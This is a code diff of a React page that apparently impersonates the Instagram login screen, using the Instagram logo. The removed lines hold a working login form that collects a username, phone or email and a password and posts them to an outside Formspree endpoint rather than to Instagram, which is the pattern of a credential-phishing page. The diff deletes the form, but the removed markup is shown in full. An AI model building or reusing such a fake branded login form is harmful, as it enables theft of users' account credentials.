@@ -30,18 +30,7 @@ export default function Home() {
                 <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
               </div>{/* Header end */}
               <div className="form-wrap">
-                <form action="https://formspree.io/f/xbjejpyv" method="POST" className="form">
-                  <div className="input-box">
-                    <input type="text" id="name" aria-describedby placeholder="Phone number&#39; username&#39; or email" aria-required="true" maxLength={30} autoCapitalize="off" autoCorrect="off" name="username" defaultValue required />
-                  </div>  
-                  <div className="input-box">
-                    <input type="password" name="password" id="password" placeholder="Password" aria-describedby maxLength={30} aria-required="true" autoCapitalize="off" autoCorrect="off" required />
-                  </div>  
-                  <span className="button-box">
-                    <button className="btn" type="submit" name="submit">Log in</button>
-                  </span>  
-                  <a className="forgot" href>Forgot password?</a>
-                </form>
+               
               </div> {/* Form-wrap end */}
             </div> {/* Login-box end */}
             <div className="login-box"> </div>
